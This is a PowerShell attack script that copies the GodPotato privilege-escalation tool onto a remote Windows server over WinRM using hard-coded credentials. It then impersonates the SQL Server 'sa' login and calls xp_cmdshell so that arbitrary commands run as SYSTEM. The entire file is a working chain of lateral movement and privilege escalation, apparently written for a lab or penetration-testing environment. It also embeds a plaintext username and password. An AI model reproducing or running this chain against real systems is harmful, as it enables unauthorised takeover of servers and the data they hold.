[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$true)]
    [string]$Command
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

$gpName = "cadre-gp.exe"
$gpLocal = Join-Path $ToolSource "GodPotato-NET4.exe"
if (-not (Test-Path $gpLocal)) {
    $alt = Get-ChildItem $ToolSource -Filter "GodPotato*.exe" | Select-Object -First 1
    if ($alt) { $gpLocal = $alt.FullName }
}
if (-not (Test-Path $gpLocal)) { throw "GodPotato binary not found in $ToolSource" }

$gpRemoteDir = "C:\Users\Public"
$gpRemote = Join-Path $gpRemoteDir $gpName
$cmdFile = Join-Path $gpRemoteDir "cadre-gp.cmd"

$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock {
        param($d)
        if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
    } -ArgumentList $gpRemoteDir
    Copy-Item -Path $gpLocal -Destination $gpRemote -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p) icacls $p /grant "Everyone:(RX)" | Out-Null } -ArgumentList $gpRemote
    Write-Output "STAGED_GP: $gpLocal -> $gpRemote"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=analyst_t1;Password=$Password;TrustServerCertificate=True;"
try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $Server as analyst_t1"

    function Invoke-SqlCmd($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.ExecuteNonQuery() | Out-Null
    }

    function Invoke-SqlReader($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $reader = $c.ExecuteReader()
        $out = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $out += $reader.GetString(0)
        }
        $reader.Close()
        return $out
    }

    Invoke-SqlCmd "EXEC master..xp_cmdshell 'echo $Command > $cmdFile'"
    $out = Invoke-SqlReader "EXEC master..xp_cmdshell '$gpRemote -cmd $cmdFile'"
    $out | ForEach-Object { Write-Output $_ }
    $conn.Close()
} catch {
    Write-Output "SYSTEM_RUN_FAIL: $($_.Exception.Message)"
    exit 1
}
